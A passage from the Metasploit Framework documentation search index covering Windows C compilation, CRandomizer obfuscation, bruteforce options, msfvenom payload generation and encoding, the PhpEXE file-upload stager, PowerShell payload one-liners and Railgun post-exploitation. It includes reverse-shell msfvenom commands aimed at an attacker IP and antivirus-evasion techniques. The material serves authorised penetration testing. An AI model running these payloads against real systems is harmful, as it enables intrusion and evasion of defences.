    "content": "c_template = %Q|#include &lt;Windows.h&gt; BOOL APIENTRY DllMain __attribute__((export))(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) { switch (dwReason) { case DLL_PROCESS_ATTACH: MessageBox(NULL, \"Hello World\", \"Hello\", MB_OK); break; case DLL_THREAD_ATTACH: break; case DLL_THREAD_DETACH: break; case DLL_PROCESS_DETACH: break; } return TRUE; } // This will be a function in the export table int Msg __attribute__((export))(void) { MessageBox(NULL, \"Hello World\", \"Hello\", MB_OK); return 0; } | require 'metasploit/framework/compiler/windows' dll = Metasploit::Framework::Compiler::Windows.compile_c(c_template, :dll) . To load a DLL, you can use the LoadLibrary API: . #include &lt;Windows.h&gt; #include &lt;stdio.h&gt; int main(void) { HMODULE hMod = LoadLibrary(\"hello_world.dll\"); if (hMod) { printf(\"hello_world.dll loaded\\n\"); } else { printf(\"Unable to load hello_world.dll\\n\"); } } . Or call the function in export with rundll32: . rundll32 hell_world.dll,Msg . ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#dll-example",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#dll-example"
  },"286": {
    "doc": "Overview",
    "title": "Printf()",
    "content": "Methods like printf() won’t actually print anything, because it’s not connected up to stdout. If you want to use printf() for debugging purposes, consider using OutputDebugString, or MessageBox. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#printf",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#printf"
  },"287": {
    "doc": "Overview",
    "title": "Custom Headers",
    "content": "Currently, the Metasm wrapper does not support custom headers from an arbitrary location. To work around this, you can place your headers in data/headers/windows, and then add that file name in lib/metasploit/framework/compiler/headers/windows.h. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#custom-headers",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#custom-headers"
  },"288": {
    "doc": "Overview",
    "title": "Code Randomization",
    "content": "Metasploit::Framework::Compiler supports obfuscation that randomizes code at the source code level, and then compile. There are two methods we can use: . | Metasploit::Framework::Compiler::Windows.compile_random_c | Metasploit::Framework::Compiler::Windows.compile_random_c_to_file | . Metasploit::Framework::Compiler::Windows.compile_random_c_to_file example: . require 'msf/core' require 'metasploit/framework/compiler/windows' c_source_code = %Q| #include &lt;Windows.h&gt; int main() { const char* content = \"Hello World\"; const char* title = \"Hi\"; MessageBox(0, content, title, MB_OK); return 0; }| outfile = \"/tmp/helloworld.exe\" weight = 70 # This value is used to determine how random the code gets. Metasploit::Framework::Compiler::Windows.compile_random_c_to_file(outfile, c_source_code, weight: weight) . ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#code-randomization",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#code-randomization"
  },"289": {
    "doc": "Overview",
    "title": "Overview",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html"
  },"290": {
    "doc": "C Obfuscation",
    "title": "How to use Metasploit::Framework::Obfuscation::CRandomizer",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#how-to-use-metasploitframeworkobfuscationcrandomizer",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#how-to-use-metasploitframeworkobfuscationcrandomizer"
  },"291": {
    "doc": "C Obfuscation",
    "title": "What is CRandomizer",
    "content": "CRandomizer is an obfuscation feature in Metasploit Framework that allows you to randomize C code. It is done by injecting random statements such as native API calls, custom fake function calls, or other routines, etc. The CRandomizer is also supported by Metasploit Framework’s code compiling API, which allows you to build a custom application that is unique (in terms of checksums), also harder to reverse-engineer. The randomness of the modification is based on a weight, an arbitrary number from 0 - 100. The higher the number, the more random the code gets. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#what-is-crandomizer",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#what-is-crandomizer"
  },"292": {
    "doc": "C Obfuscation",
    "title": "Components",
    "content": "CRandomizer relies on Metasm to be able to parse C code. The following components are built to parse and modify the source code. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#components",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#components"
  },"293": {
    "doc": "C Obfuscation",
    "title": "Code Factory",
    "content": "Also known as Metasploit::Framework::Obfuscation::CRandomizer::CodeFactory. The CodeFactory module is used to make the random stubs that will get injected later in the source code. Currently, the things this class is capable of making include small stubs like if statements, a switch, fake functions, and Windows API calls, etc. Each stub tends to be small, and considered as benign by most AVs. Every class in CodeFactory, except for Base, FakeFunction, and FakeFunctionCollection, is a stub candidate that gets randomly selected and used in the source code. If a stub requires a native API call, then the class can specify @dep to set that dependency. If the source code does not support the API call, then the next stub candidate is used (or until one is found). For example, the CRandomizer::CodeFactory::OutputDebugString class is used to generate a fake OutputDebugString call, and the dependency is set as ['OutputDebugString']. If the source code includes the Windows.h header, the CRandomizer knows it is okay to inject OutputDebugString. If not, CRandomizer will not use it. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#code-factory",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#code-factory"
  },"294": {
    "doc": "C Obfuscation",
    "title": "Modifier",
    "content": "Also known as Metasploit::Framework::Obfuscation::CRandomizer::Modifier. The Modifier class decides how something should be modified, and actually modifies the source code, for example: a function, different if statements, loops, nested blocks, etc. While the modifier walks through the source, it will randomly inject extra code (provided by the CodeFactory class) at each statement, until there are no more functions to modify. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#modifier",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#modifier"
  },"295": {
    "doc": "C Obfuscation",
    "title": "Parser",
    "content": "Also known as Metasploit::Framework::Obfuscation::CRandomizer::Parser. The main purpose of the Parser class is to convert the source code into a parsable format using Metasm, and then pass the functions to the Modifier class to process. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#parser",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#parser"
  },"296": {
    "doc": "C Obfuscation",
    "title": "Utility",
    "content": "The Utility class provides quick-to-use methods that any CRandomizer classes could use. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#utility",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#utility"
  },"297": {
    "doc": "C Obfuscation",
    "title": "Code Example",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#code-example",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#code-example"
  },"298": {
    "doc": "C Obfuscation",
    "title": "Creating a new stub",
    "content": "First, add a new file under the code_factory with an arbitrary file name. For example: hello.rb. In this example, let’s create a new stub that will printf() “Hello World”. Your stub should be written as a class under the CodeFactory namespace, and make sure to inherit the Base class. Like this: . require 'metasploit/framework/obfuscation/crandomizer/code_factory/base' module Metasploit module Framework module Obfuscation module CRandomizer module CodeFactory class Printf &lt; Base def initialize super @dep = ['printf'] end def stub %Q| int printf(const char*); void stub() { printf(\"Hello World\"); }| end end end end end end end . Notice a couple of things: . | Every class should have its own stub method. And this stub method should return a string that contains the code you wish to inject. In addition, your code should be written as a function so that Metasm knows how to pick it up, hence the printf is in a void stub() function. | If your stub requires a native API (in this case, we are using printf), then you must add this function name in the @dep instance variable, which is an array. | Please keep in mind that your stub should remain simple and small, and not unique. For example, avoid: . | Allocate a huge chunk of memory | Avoid marking or allocating executable memory | Loops | Load referenced section, resource, or .data | Anti-debugging functions from the Windows API | Lots of function calls | Unique strings | APIs that access the Windows registry or the file system | XOR | Shellcode | Any other suspicious code patterns that are unique to malware. | . | . ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#creating-a-new-stub",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#creating-a-new-stub"
  },"299": {
    "doc": "C Obfuscation",
    "title": "Randomizing source code",
    "content": "Please refer to tools/exploit/random_compile_c.rb for example. ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#randomizing-source-code",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html#randomizing-source-code"
  },"300": {
    "doc": "C Obfuscation",
    "title": "C Obfuscation",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html",
    "relUrl": "/docs/development/developing-modules/libraries/obfuscation/how-to-use-metasploit-framework-obfuscation-crandomizer.html"
  },"301": {
    "doc": "AuthBrute",
    "title": "How to use Msf::Auxiliary::AuthBrute to write a bruteforcer",
    "content": "The Msf::Auxiliary::AuthBrute mixin should no longer be used to write a login module, you should try our LoginScanner API instead. However, some of the datastore options are still needed, so let’s go over them right quick. Regular options . | USERNAME - (String) A specific username to authenticate as. | PASSWORD - (String) A specific password to authenticate with. | USER_FILE - (String) File containing usernames, one per line. | PASS_FILE - (String) File containing passwords, one per line. | USERPASS_FILE - (String) File containing users and passwords separated by space, one pair per line. | BRUTEFORCE_SPEED - (Integer) How fast to bruteforce, from 0 to 5. | VERBOSE - (Boolean) Whether to print output for all attempts. | BLANK_PASSWORDS - (Boolean) Try blank passwords for all users. | USER_AS_PASS - (Boolean) Try the username as the password for all users. | DB_ALL_CREDS - (Boolean) Try each user/password couple stored in the current database. | DB_ALL_USERS - (Boolean) Add all users in the current database to the list. | STOP_ON_SUCCESS - (Boolean) Stop guessing when a credential works for a host. | . Advanced options . | REMOVE_USER_FILE - (Boolean) Automatically delete the USER_FILE on module completion. | REMOVE_PASS_FILE - (Boolean) Automatically delete the PASS_FILE on module completion. | REMOVE_USERPASS_FILE - (Boolean) Automatically delete the USERPASS_FILE on module completion. | MaxGuessesPerService - (Integer) Maximum number of credentials to try per service instance. If set to zero or a non-number, this option will not be used. | MaxMinutesPerService - (Integer) Maximum time in minutes to bruteforce the service instance. If set to zero or a non-number, this option will not be used. | MaxGuessesPerUser - (Integer) Maximum guesses for a particular username for the service instance. Note that users are considered unique among different services, so a user at 10.1.1.1:22 is different from one at 10.2.2.2:22, and both will be tried up to the MaxGuessesPerUser limit. If set to zero or a non-number, this option will not be used. | . Reference . | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/auxiliary/auth_brute.rb | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html#how-to-use-msfauxiliaryauthbrute-to-write-a-bruteforcer",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html#how-to-use-msfauxiliaryauthbrute-to-write-a-bruteforcer"
  },"302": {
    "doc": "AuthBrute",
    "title": "AuthBrute",
    "content": " ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-msf-auxiliary-authbrute-to-write-a-bruteforcer.html"
  },"303": {
    "doc": "How to use msfvenom",
    "title": "How to generate a payload",
    "content": "To generate a payload, there are two flags that you must supply (-p and -f): . | The -p flag: Specifies what payload to generate | . To see what payloads are available from Framework, you can do: ./msfvenom -l payloads . The -p flag also supports “-“ as a way to accept a custom payload: . cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw . | The -f flag: Specifies the format of the payload | . Syntax example: ./msfvenom -p windows/meterpreter/bind_tcp -f exe . To see what formats are supported, you can do the following to find out: ./msfvenom --help-formats . Typically, this is probably how you will use msfvenom: . $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe . ",
    "url": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-generate-a-payload",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-generate-a-payload"
  },"304": {
    "doc": "How to use msfvenom",
    "title": "How to encode a payload",
    "content": "By default, the encoding feature will automatically kick in when you use the -b flag (the badchar flag). In other cases, you must use the -e flag like the following: ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw . To find out what encoders you can use, you can use the -l flag: ./msfvenom -l encoders . You can also encode the payload multiple times using the -i flag. Sometimes more iterations may help avoiding antivirus, but know that encoding isn’t really meant to be used a real AV evasion solution: ./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3 . ",
    "url": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-encode-a-payload",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-encode-a-payload"
  },"305": {
    "doc": "How to use msfvenom",
    "title": "How to avoid bad characters",
    "content": "The -b flag is meant to be used to avoid certain characters in the payload. When this option is used, msfvenom will automatically find a suitable encoder to encode the payload: ./msfvenom -p windows/meterpreter/bind_tcp -b '\\x00' -f raw . ",
    "url": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-avoid-bad-characters",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-avoid-bad-characters"
  },"306": {
    "doc": "How to use msfvenom",
    "title": "How to supply a custom template",
    "content": "By default, msfvenom uses templates from the msf/data/templates directory. If you’d like to choose your own, you can use the -x flag like the following: ./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe . Please note: If you’d like to create a x64 payload with a custom x64 custom template for Windows, then instead of the exe format, you should use exe-only: ./msfvenom -p windows/x64/meterpreter/bind_tcp -x /tmp/templates/64_calc.exe -f exe-only &gt; /tmp/fake_64_calc.exe . The -x flag is often paired with the -k flag, which allows you to run your payload as a new thread from the template. However, this currently is only reliable for older Windows machines such as x86 Windows XP. ",
    "url": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-supply-a-custom-template",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-supply-a-custom-template"
  },"307": {
    "doc": "How to use msfvenom",
    "title": "How to chain msfvenom output",
    "content": "The old msfpayload and msfencode utilities were often chained together in order layer on multiple encodings. This is possible using msfvenom as well: ./msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.3 LPORT=4444 -f raw -e x86/shikata_ga_nai -i 5 | \\ ./msfvenom -a x86 --platform windows -e x86/countdown -i 8 -f raw | \\ ./msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -f exe -o payload.exe . ",
    "url": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-chain-msfvenom-output",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-msfvenom.html#how-to-chain-msfvenom-output"
  },"308": {
    "doc": "How to use msfvenom",
    "title": "How to use msfvenom",
    "content": "Msfvenom is the combination of payload generation and encoding. It replaced msfpayload and msfencode on June 8th 2015. To start using msfvenom, first please take a look at the options it supports: . Options: -p, --payload &lt;payload&gt; Payload to use. Specify a '-' or stdin to use custom payloads --payload-options List the payload's standard options -l, --list [type] List a module type. Options are: payloads, encoders, nops, all -n, --nopsled &lt;length&gt; Prepend a nopsled of [length] size on to the payload -f, --format &lt;format&gt; Output format (use --help-formats for a list) --help-formats List available formats -e, --encoder &lt;encoder&gt; The encoder to use -a, --arch &lt;arch&gt; The architecture to use --platform &lt;platform&gt; The platform of the payload --help-platforms List available platforms -s, --space &lt;length&gt; The maximum size of the resulting payload --encoder-space &lt;length&gt; The maximum size of the encoded payload (defaults to the -s value) -b, --bad-chars &lt;list&gt; The list of characters to avoid example: '\\x00\\xff' -i, --iterations &lt;count&gt; The number of times to encode the payload -c, --add-code &lt;path&gt; Specify an additional win32 shellcode file to include -x, --template &lt;path&gt; Specify a custom executable file to use as a template -k, --keep Preserve the template behavior and inject the payload as a new thread -o, --out &lt;path&gt; Save the payload -v, --var-name &lt;name&gt; Specify a custom variable name to use for certain output formats --smallest Generate the smallest possible payload -h, --help Show this message . ",
    "url": "/docs/using-metasploit/basics/how-to-use-msfvenom.html",
    "relUrl": "/docs/using-metasploit/basics/how-to-use-msfvenom.html"
  },"309": {
    "doc": "PhpExe",
    "title": "PhpExe",
    "content": "Arbitrary file upload is surprisingly common among web applications, which can be abused to upload malicious files and then compromise the server. Usually, the attacker will select a payload based on whatever server-side programming language is supported. So if the vulnerable app is in PHP, then clearly PHP is supported, therefore an easy choice would be using a PHP payload such as Metasploit’s PHP meterpreter. However, the PHP meterpreter does not share the same performance as, say, a Windows meterpreter. So in reality, what happens is you will probably want to upgrade to a better shell, which involves extra manual work during the process. So why limit your payload options? For this type of scenario, you should use the PhpEXE mixin. It serves as a payload stager in PHP that will write the final malicious executable onto the remote file system, and then clear itself after use, so it leaves no traces. Requirements . To use the PhpEXE mixin, some typical exploitable requirements should be met: . | You must find a writeable location on the web server. | The same writeable location should also be readable with a HTTP request. | . Note: For an arbitrary file upload bug, there is usually a directory that contains uploaded files, and is readable. If the bug is due to a directory traversal, then a temp folder (either from the OS or the web app) would be your typical choice. Usage . First include the mixin under the scope of your MetasploitModule class like the following: . include Msf::Exploit::PhpEXE . Generate the payload (with the PHP stager) with get_write_exec_payload . p = get_write_exec_payload . If you’re working on a Linux target, then you can set unlink_self to true, which will automatically clear the executable: . p = get_write_exec_payload(:unlink_self=&gt;true) . On Windows, you probably cannot clear the executable because it will probably still be in use. If it’s not possible to automatically clean up malicious files, you should always warn the user about where they are, so they can do it manually later during the penetration test. At this point you can upload the payload generated by get_write_exec_payload, and then call it by using a GET request. If you do not know how to send a GET request, please refer to the following article: How to Send an HTTP Request Using HttpClient . Reference . https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/php_exe.rb . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-phpexe-to-exploit-an-arbitrary-file-upload-bug.html"
  },"310": {
    "doc": "Powershell",
    "title": "Powershell",
    "content": "PowerShell is a scripting language developed by Microsoft. It provides API access to almost everything in a Windows platform, less detectable by countermeasures, easy to learn, therefore it is incredibly powerful for penetration testing during post exploitation, or exploit development for payload execution. Take Metasploit’s windows/smb/psexec_psh.rb module for example: it mimics the psexec utility from SysInternals, the payload is compressed and executed from the command line, which allows it to be somewhat stealthy against antivirus. There’s only less than 30 lines of code in psexec_psh.rb (excluding the metadata that describes what the module is about), because most of the work is done by the Powershell mixin, nothing is easier than that. The command line will automatically attempt to detect the architecture (x86 or x86_64) that it is being run in, as well as the payload architecture that it contains. If there is a mismatch it will spawn the correct PowerShell architecture to inject the payload into, so there is no need to worry about the architecture of the target system. Requirements . To use the PowerShell mixin, make sure you meet these requirements: . | The target machine supports PowerShell. Vista or newer should support it. | You must have permission to execute powershell.exe | You must be able to supply system command arguments. | You must set up a command execution type attack in order to execute powershell.exe | . Usage . | To add PowerShell to your module, first you need to require it: | . require 'msf/core/exploit/powershell' . | And then include the mixin within the scope of the Metasploit3 class (or maybe Metasploit4 for some) | . include Msf::Exploit::Powershell . | Use the cmd_psh_payload method to generate the PowerShell payload. | . cmd_psh_payload(payload.encoded, payload_instance.arch.first) . The actual output of cmd_psh_payload is a system command, which would look like the following format (as a one-liner): . %COMSPEC% /B /C start powershell.exe -Command $si = New-Object System.Diagnostics.ProcessStartInfo;$si.FileName = 'powershell.exe'; $si.Arguments = ' -EncodedCommand [BASE64 PAYLOAD] '; $si.UseShellExecute = $false; $si.RedirectStandardOutput = $true;$si.WindowStyle = 'Hidden'; $si.CreateNoWindow = $True; $p = [System.Diagnostics.Process]::Start($si); . A number of options can be used to adjust the final command depending on the circumstances of the exploit. By default the script is compressed but no encoding takes places of the wrapper. This produces a small command of around ~2000 characters (depending on the payload). Of these encode_final_payload is the most noteworthy as it will Base64 encode the full payload giving a very simple command with very few bad characters. However, the command length will increase as a result. Combining this with remove_comspec means the payload would very simply be: . powershell.exe -nop -ep bypass -e AAAABBBBCCCCDDDD.....== . Check out the other advanced options in the API documentation below. References . | https://rapid7.github.io/metasploit-framework/api/Msf/Exploit/Powershell.html | https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/powershell.rb | https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/powershell/powerdump.ps1 | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-powershell-in-an-exploit.html"
  },"311": {
    "doc": "Railgun",
    "title": "Railgun",
    "content": "Railgun is a very powerful post exploitation feature exclusive to Windows Meterpreter. It allows you to have complete control of your target machine’s Windows API, or you can use whatever DLL you find and do even more creative stuff with it. For example: say you have a meterpreter session on a Windows target. You have your eyes on a particular application that you believe stores the user’s password, but it is encrypted and there are no tools out there for decryption. With Railgun, what you can do is you can either tap into the process and grep for any sensitive information found in memory, or you can look for the program’s DLL that’s responsible for the decryption, call it, and let it decrypt it for you. If you’re a penetration tester, obviously post exploitation is an important skill to have, but if you don’t know Railgun, you are missing out a lot. Defining a DLL and its functions . The Windows API is obviously quite large, so by default Railgun only comes with a handful of pre-defined DLLs and functions that are commonly used for building a Windows program. These built-in DLLs are: kernel32, ntdll, user32, ws2_32, iphlpapi, advapi32, shell32, netapi32, crypt32, wlanapi, wldap32, version. The same list of built-in DLLs can also be retrieved by using the known_dll_names method. All DLL definitions are found in the “def” directory, where they are defined as classes. The following template should demonstrate how a DLL is actually defined: . # -*- coding: binary -*- module Rex module Post module Meterpreter module Extensions module Stdapi module Railgun module Def class Def_somedll def self.create_dll(dll_path = 'somedll') dll = DLL.new(dll_path, ApiConstants.manager) # 1st argument = Name of the function # 2nd argument = Return value's data type # 3rd argument = An array of parameters dll.add_function('SomeFunction', 'DWORD',[ [\"DWORD\",\"hwnd\",\"in\"] ]) return dll end end end; end; end; end; end; end; end . In function definitions, Railgun supports these datatypes: VOID, BOOL, DWORD, WORD, BYTE, LPVOID, HANDLE, PDWORD, PWCHAR, PCHAR, PBLOB. There are four parameter/buffer directions: in, out, inout, and return. When you pass a value to an “in” parameter, Railgun handles the memory management. For example, MessageBoxA has a “in” parameter named lpText, and is of type PCHAR. You can simply pass a Ruby string to it, and Railgun handles the rest, it’s all pretty straight forward. An “out” parameter will always be of a pointer datatype. Basically you tell Railgun how many bytes to allocate for the parameter, it allocates memory, provides a pointer to it when calling the function, and then it reads that region of memory that the function wrote, converts that to a Ruby object and adds it to the return hash. An “inout” parameter serves as an input to the called function, but can be potentially modified by it. You can inspect the return hash for the modified value like an “out” parameter. A quick way to define a new function at runtime can be done like the following example: . client.railgun.add_function('user32', 'MessageBoxA', 'DWORD',[ [\"DWORD\",\"hWnd\",\"in\"], [\"PCHAR\",\"lpText\",\"in\"], [\"PCHAR\",\"lpCaption\",\"in\"], [\"DWORD\",\"uType\",\"in\"] ]) . However, if this function will most likely be used more than once, or it’s part of the Windows API, then you should put it in the library. Usage . The best way to try Railgun is with irb in a Windows Meterpreter prompt. Here’s an example of how to get there: . $ msfconsole -q msf &gt; use exploit/multi/handler msf exploit(handler) &gt; run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.106:55148) at 2014-07-30 19:49:35 -0500 meterpreter &gt; irb [*] Starting IRB shell [*] The 'client' variable holds the meterpreter client &gt;&gt; . Note that when you’re running a post module or in irb, you always have a client or session object to work with, both point to same thing, which in this case is Msf::Sessions::Meterpreter_x86_Win. This Meterpreter session object gives you API access to the target machine, including the Railgun object Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun. Here’s how you simply access it: . session.railgun . If you run the above in irb, you will see that it returns information about all the DLLs, functions, constants, etc, except it’s a little unfriendly to read because there’s so much data. Fortunately, there are some handy tricks to help us to figure things out. For example, like we mentioned before, if you’re not sure what DLLs are loaded, you can call the known_dll_names method: . &gt;&gt; session.railgun.known_dll_names =&gt; [\"kernel32\", \"ntdll\", \"user32\", \"ws2_32\", \"iphlpapi\", \"advapi32\", \"shell32\", \"netapi32\", \"crypt32\", \"wlanapi\", \"wldap32\", \"version\"] . Now, say we’re interested in user32 and we want to find all the available functions (as well as return value’s data type, parameters), another handy trick is this: . session.railgun.user32.functions.each_pair {|n, v| puts \"Function name: #{n}, Returns: #{v.return_type}, Params: #{v.params}\"} . Note that if you happen to call an invalid or unsupported Windows function, a RuntimeError will raise, and the error message also shows a list of available functions. To call a Windows API function, here’s how: . &gt;&gt; session.railgun.user32.MessageBoxA(0, \"hello, world\", \"hello\", \"MB_OK\") =&gt; {\"GetLastError\"=&gt;0, \"ErrorMessage\"=&gt;\"The operation completed successfully.\", \"return\"=&gt;1} . As you can see this API call returns a hash. One habit we have seen is that sometimes people don’t like to check GetLastError, ErrorMessage, and/or the return value, they kind of just assume it works. This is a bad programming habit, and is not recommended. If you always assume something works, and execute the next API call, you risk having unexpected results (worst case scenario: losing the Meterpreter session). Memory Reading and Writing . The Railgun class also has two very useful methods that you will probably use: memread and memwrite. The names are pretty self-explanatory: You read a block of memory, or you write to a region of memory. We’ll demonstrate this with a new block of memory in the payload itself: . &gt;&gt; p = session.sys.process.open(session.sys.process.getpid, PROCESS_ALL_ACCESS) =&gt; #&lt;#&lt;Class:0x007fe2e051b740&gt;:0x007fe2c5a258a0 @client=#&lt;Session:meterpreter 192.168.1.106:55151 (192.168.1.106) \"WIN-6NH0Q8CJQVM\\sinn3r @ WIN-6NH0Q8CJQVM\"&gt;, @handle=448, @channel=nil, @pid=2268, @aliases={\"image\"=&gt;#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Image:0x007fe2c5a25828 @process=#&lt;#&lt;Class:0x007fe2e051b740&gt;:0x007fe2c5a258a0 ...&gt;&gt;, \"io\"=&gt;#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::IO:0x007fe2c5a257b0 @process=#&lt;#&lt;Class:0x007fe2e051b740&gt;:0x007fe2c5a258a0 ...&gt;&gt;, \"memory\"=&gt;#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Memory:0x007fe2c5a25738 @process=#&lt;#&lt;Class:0x007fe2e051b740&gt;:0x007fe2c5a258a0 ...&gt;&gt;, \"thread\"=&gt;#&lt;Rex::Post::Meterpreter::Extensions::Stdapi::Sys::ProcessSubsystem::Thread:0x007fe2c5a256c0 @process=#&lt;#&lt;Class:0x007fe2e051b740&gt;:0x007fe2c5a258a0 ...&gt;&gt;}&gt; &gt;&gt; p.memory.allocate(1024) =&gt; 5898240 . As you can see, the new allocation is at address 5898240 (or 0x005A0000 in hex). Let’s first write four bytes to it: . &gt;&gt; session.railgun.memwrite(5898240, \"AAAA\", 4) =&gt; true . memwrite returns true, which means successful. Now let’s read 4 bytes from 0x005A0000: . &gt;&gt; session.railgun.memread(5898240, 4) =&gt; \"AAAA\" . Be aware that if you supply a bad pointer, you can cause an access violation and crash Meterpreter. References: . | https://www.youtube.com/watch?v=AniR-T0AnnI | https://www.defcon.org/images/defcon-20/dc-20-presentations/Maloney/DEFCON-20-Maloney-Railgun.pdf | https://github.com/rapid7/metasploit-framework/tree/master/lib/rex/post/meterpreter/extensions/stdapi/railgun | http://msdn.microsoft.com/en-us/library/ms681381(VS.85).aspx | http://msdn.microsoft.com/en-us/library/aa383749 | http://undocumented.ntinternals.net/ | http://source.winehq.org/WineAPI/ | . ",
    "url": "/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html",
    "relUrl": "/docs/development/developing-modules/libraries/how-to-use-railgun-for-windows-post-exploitation.html"
  },"312": {
    "doc": "How to use the Favorite command",
    "title": "Using the Favorite Command",
